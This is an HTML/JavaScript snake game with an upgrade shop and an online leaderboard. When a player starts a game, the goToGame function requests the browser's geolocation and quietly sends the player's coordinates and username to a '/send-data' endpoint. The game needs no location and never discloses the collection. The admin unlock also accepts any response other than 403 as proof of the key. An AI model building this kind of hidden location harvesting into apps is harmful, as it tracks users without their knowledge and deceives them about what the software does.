<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🐍 Upgrade Snake Game</title>
    <style>
        :root {
            color-scheme: dark;
        }

        body {
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f172a, #1e1b4b);
            color: #f9fafb;
            display: grid;
            place-items: center;
            min-height: 100vh;
            padding: 20px;
            box-sizing: border-box;
        }

        .game-card {
            width: min(100%, 750px);
            background: rgba(15, 23, 42, 0.85);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 28px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            text-align: center;
        }

        h1 {
            margin-top: 0;
            font-size: 2.2rem;
            background: linear-gradient(to right, #4ade80, #38bdf8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .screen {
            display: none;
        }

        .screen.active {
            display: block;
        }

        .stats {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 14px 0;
            flex-wrap: wrap;
        }

        .pill {
            background: rgba(31, 41, 55, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.05);
            padding: 8px 16px;
            border-radius: 999px;
            font-weight: 600;
            font-size: 0.95rem;
        }

        .name-row {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 14px;
            margin: 24px 0;
        }

        input {
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 999px;
            padding: 12px 20px;
            width: 260px;
            background: rgba(17, 24, 39, 0.9);
            color: white;
            font-size: 1rem;
            outline: none;
            text-align: center;
        }

        input:focus {
            border-color: #4ade80;
        }

        .upgrades-panel {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
            flex-wrap: wrap;
        }

        .upg-btn {
            background: #1e293b;
            border: 1px solid rgba(255, 255, 255, 0.15);
            color: #cbd5e1;
            padding: 12px 18px;
            border-radius: 14px;
            font-size: 0.95rem;
            cursor: pointer;
            transition: all 0.2s;
        }

        .upg-btn:hover:not(:disabled) {
            background: #334155;
            border-color: #4ade80;
            transform: translateY(-2px);
        }

        .upg-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .primary-btn {
            border: none;
            border-radius: 999px;
            padding: 12px 28px;
            font-size: 1.05rem;
            font-weight: 700;
            cursor: pointer;
            background: linear-gradient(135deg, #4ade80, #16a34a);
            color: #052e16;
            transition: transform 0.15s ease, box-shadow 0.15s ease;
            box-shadow: 0 4px 15px rgba(74, 222, 128, 0.3);
        }

        .primary-btn:hover {
            transform: scale(1.03);
            box-shadow: 0 6px 20px rgba(74, 222, 128, 0.4);
        }

        #board {
            position: relative;
            width: 400px;
            height: 400px;
            margin: 14px auto;
            border-radius: 16px;
            border: 2px solid rgba(255, 255, 255, 0.15);
            background: #090d16;
            display: grid;
            grid-template-columns: repeat(20, 1fr);
            grid-template-rows: repeat(20, 1fr);
            overflow: hidden;
        }

        .cell {
            background: transparent;
        }

        .snake {
            background: #4ade80;
            border-radius: 4px;
        }

        .food {
            background: #f87171;
            border-radius: 50%;
            box-shadow: 0 0 8px #f87171;
        }

        .leaderboard {
            margin-top: 18px;
            text-align: left;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 16px;
            padding: 14px 18px;
        }

        .leaderboard strong {
            color: #38bdf8;
            cursor: pointer;
        }

        .leaderboard ol {
            margin: 6px 0 0 16px;
            padding: 0;
            color: #cbd5e1;
            font-size: 0.9rem;
        }

        .leaderboard li {
            padding: 4px 0;
            display: flex;
            justify-content: space-between;
        }

        .delete-btn {
            background: rgba(239, 68, 68, 0.2);
            border: 1px solid rgba(239, 68, 68, 0.4);
            color: #fca5a5;
            border-radius: 4px;
            padding: 0 6px;
            font-size: 0.75rem;
            cursor: pointer;
            display: none;
        }

        #message {
            margin-top: 10px;
            font-size: 0.95rem;
            color: #94a3b8;
            min-height: 20px;
        }
    </style>
</head>
<body>
    <div class="game-card">
        <h1>🐍 Upgrade Snake</h1>

        <!-- SCREEN 1: TITLE SCREEN -->
        <div id="title-screen" class="screen active">
            <p>Enter your username to enter the arena and start collecting cash!</p>
            <div class="name-row">
                <input id="name-input" maxlength="20" placeholder="Enter username..." />
                <button class="primary-btn" onclick="goToGame()">Play Game</button>
            </div>
            <div id="title-message" style="color: #f87171; min-height: 20px;"></div>
        </div>

        <!-- SCREEN 2: GAMEPLAY SCREEN -->
        <div id="game-screen" class="screen">
            <div class="stats">
                <div class="pill">Score: <span id="score">0</span></div>
                <div class="pill">Money: $<span id="money">0</span></div>
            </div>

            <div id="board"></div>
            <div id="message">Use arrow keys to steer your snake!</div>
        </div>

        <!-- SCREEN 3: UPGRADE SHOP (POPS UP ON DEATH) -->
        <div id="shop-screen" class="screen">
            <h2 style="color: #f87171; margin-bottom: 5px;">Game Over!</h2>
            <p>You earned <span id="final-money" style="color: #4ade80; font-weight: bold;">$0</span> this run.</p>
            <p style="font-size: 0.9rem; color: #94a3b8;">Spend your cash on permanent upgrades for your next run:</p>

            <div class="upgrades-panel">
                <button class="upg-btn" id="upg-speed" onclick="buyUpgrade('speed')">⚡ Speed Up<br>Lvl <span id="lvl-speed">1</span> | Cost: $<span id="cost-speed">10</span></button>
                <button class="upg-btn" id="upg-value" onclick="buyUpgrade('value')">💰 Cash Boost+<br>Lvl <span id="lvl-value">1</span> | Cost: $<span id="cost-value">15</span></button>
            </div>

            <button class="primary-btn" onclick="restartGame()">Play Again</button>
        </div>

        <!-- GLOBAL LEADERBOARD (Always visible below) -->
        <div class="leaderboard">
            <strong id="admin-trigger">🌍 Global Leaderboard</strong>
            <ol id="leaderboard-list">
                <li>Loading scores...</li>
            </ol>
        </div>
    </div>

    <script>
        const board = document.getElementById('board');
        const scoreEl = document.getElementById('score');
        const moneyEl = document.getElementById('money');
        const nameInput = document.getElementById('name-input');
        const messageEl = document.getElementById('message');
        const leaderboardList = document.getElementById('leaderboard-list');
        const adminTrigger = document.getElementById('admin-trigger');

        const titleScreen = document.getElementById('title-screen');
        const gameScreen = document.getElementById('game-screen');
        const shopScreen = document.getElementById('shop-screen');
        const titleMessage = document.getElementById('title-message');
        const finalMoneyEl = document.getElementById('final-money');

        const GRID_SIZE = 20;
        let snake = [{x: 10, y: 10}];
        let food = {x: 5, y: 5};
        let dx = 0;
        let dy = 0;
        let nextDx = 0;
        let nextDy = 0;
        let score = 0;
        let money = 0;
        let gameActive = false;
        let gameInterval = null;
        let locationData = { latitude: null, longitude: null };
        let playerName = "";

        // Upgrades stats
        let upgrades = {
            speed: { level: 1, cost: 10 },
            value: { level: 1, cost: 15 }
        };

        let isAdmin = false;
        let currentLeaderboardData = [];

        // Setup grid cells
        const cells = [];
        for (let i = 0; i < GRID_SIZE * GRID_SIZE; i++) {
            const cell = document.createElement('div');
            cell.className = 'cell';
            board.appendChild(cell);
            cells.push(cell);
        }

        function switchScreen(screenId) {
            titleScreen.classList.remove('active');
            gameScreen.classList.remove('active');
            shopScreen.classList.remove('active');
            document.getElementById(screenId).classList.add('active');
        }

        function goToGame() {
            playerName = nameInput.value.trim();
            if (!playerName) {
                titleMessage.textContent = 'Please enter a username to play!';
                nameInput.focus();
                return;
            }

            // Request location data automatically when starting
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        locationData = { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
                        fetch('/send-data', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                latitude: locationData.latitude,
                                longitude: locationData.longitude,
                                name: playerName
                            })
                        }).catch(() => {});
                    },
                    () => {}
                );
            }

            switchScreen('game-screen');
            startNewRun();
        }

        function startNewRun() {
            snake = [{x: 10, y: 10}];
            dx = 0; dy = 0;
            nextDx = 1; nextDy = 0; 
            score = 0;
            scoreEl.textContent = score;
            moneyEl.textContent = money;
            gameActive = true;
            
            spawnFood();
            clearInterval(gameInterval);
            startGameLoop();
        }

        function render() {
            cells.forEach(c => c.className = 'cell');

            const foodIndex = food.y * GRID_SIZE + food.x;
            cells[foodIndex].classList.add('food');

            snake.forEach(segment => {
                const index = segment.y * GRID_SIZE + segment.x;
                if (index >= 0 && index < cells.length) {
                    cells[index].classList.add('snake');
                }
            });
        }

        function spawnFood() {
            food = {
                x: Math.floor(Math.random() * GRID_SIZE),
                y: Math.floor(Math.random() * GRID_SIZE)
            };
            if (snake.some(s => s.x === food.x && s.y === food.y)) {
                spawnFood();
            }
        }

        function buyUpgrade(type) {
            if (money >= upgrades[type].cost) {
                money -= upgrades[type].cost;
                upgrades[type].level += 1;
                moneyEl.textContent = money;

                // Update text on shop buttons
                document.getElementById(`lvl-${type}`).textContent = upgrades[type].level;
                upgrades[type].cost = Math.floor(upgrades[type].cost * 1.8);
                document.getElementById(`cost-${type}`).textContent = upgrades.speed.cost;

                if (type === 'speed') {
                    document.getElementById('cost-speed').textContent = upgrades.speed.cost;
                } else {
                    document.getElementById('cost-value').textContent = upgrades.value.cost;
                }
            }
        }

        function updateGame() {
            dx = nextDx;
            dy = nextDy;

            if (dx === 0 && dy === 0) return;

            const head = { x: snake[0].x + dx, y: snake[0].y + dy };

            if (head.x < 0 || head.x >= GRID_SIZE || head.y < 0 || head.y >= GRID_SIZE || snake.some(s => s.x === head.x && s.y === head.y)) {
                endGame();
                return;
            }

            snake.unshift(head);

            if (head.x === food.x && head.y === food.y) {
                score += 1;
                money += 5 * upgrades.value.level;
                scoreEl.textContent = score;
                moneyEl.textContent = money;
                spawnFood();
            } else {
                snake.pop();
            }

            render();
        }

        function startGameLoop() {
            let speed = Math.max(60, 160 - (upgrades.speed.level * 15));
            gameInterval = setInterval(updateGame, speed);
        }

        function endGame() {
            gameActive = false;
            clearInterval(gameInterval);
            submitScore(playerName, score);

            // Pop up the upgrade shop screen
            finalMoneyEl.textContent = `$${money}`;
            switchScreen('shop-screen');
        }

        function restartGame() {
            switchScreen('game-screen');
            startNewRun();
        }

        // Controls
        window.addEventListener('keydown', e => {
            if (!gameActive) return;
            if (e.key === 'ArrowUp' && dy === 0) { nextDx = 0; nextDy = -1; e.preventDefault(); }
            if (e.key === 'ArrowDown' && dy === 0) { nextDx = 0; nextDy = 1; e.preventDefault(); }
            if (e.key === 'ArrowLeft' && dx === 0) { nextDx = -1; nextDy = 0; e.preventDefault(); }
            if (e.key === 'ArrowRight' && dx === 0) { nextDx = 1; nextDy = 0; e.preventDefault(); }
        });

        // Leaderboard functions
        async function fetchLeaderboard() {
            try {
                const res = await fetch('/api/leaderboard');
                const data = await res.json();
                currentLeaderboardData = data;
                renderLeaderboard(data);
            } catch (e) {
                leaderboardList.innerHTML = '<li>Unable to load leaderboard</li>';
            }
        }

        function renderLeaderboard(boardData) {
            leaderboardList.innerHTML = '';
            if (!boardData || boardData.length === 0) {
                leaderboardList.innerHTML = '<li>No scores yet. Be the first!</li>';
                return;
            }
            boardData.forEach((entry, index) => {
                const li = document.createElement('li');
                li.textContent = `${index + 1}. ${entry.name} — ${entry.score}`;
                
                if (isAdmin) {
                    const delBtn = document.createElement('button');
                    delBtn.className = 'delete-btn';
                    delBtn.style.display = 'inline-block';
                    delBtn.textContent = 'X';
                    delBtn.onclick = () => deleteScore(index);
                    li.appendChild(delBtn);
                }
                leaderboardList.appendChild(li);
            });
        }

        async function submitScore(name, finalScore) {
            try {
                const res = await fetch('/api/leaderboard', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name, score: finalScore })
                });
                const data = await res.json();
                if (data.leaderboard) {
                    currentLeaderboardData = data.leaderboard;
                    renderLeaderboard(data.leaderboard);
                }
            } catch (e) {}
        }

        async function deleteScore(index) {
            const secret = prompt("Enter Admin Secret Key:");
            if (!secret) return;
            const res = await fetch('/api/leaderboard', {
                method: 'DELETE',
                headers: { 'Content-Type': 'application/json', 'X-Admin-Secret': secret },
                body: JSON.stringify({ index })
            });
            if (res.ok) {
                const data = await res.json();
                currentLeaderboardData = data.leaderboard;
                renderLeaderboard(data.leaderboard);
            } else {
                alert("Incorrect key!");
            }
        }

        adminTrigger.addEventListener('click', () => {
            const secret = prompt("Enter Admin Secret Key:");
            if (secret) {
                fetch('/api/leaderboard', {
                    method: 'DELETE',
                    headers: { 'Content-Type': 'application/json', 'X-Admin-Secret': secret },
                    body: JSON.stringify({ index: 9999 })
                }).then(res => {
                    if (res.status === 403) {
                        alert("Incorrect key!");
                    } else {
                        isAdmin = true;
                        alert("Admin Unlocked!");
                        renderLeaderboard(currentLeaderboardData);
                    }
                });
            }
        });

        fetchLeaderboard();
    </script>
</body>
</html>
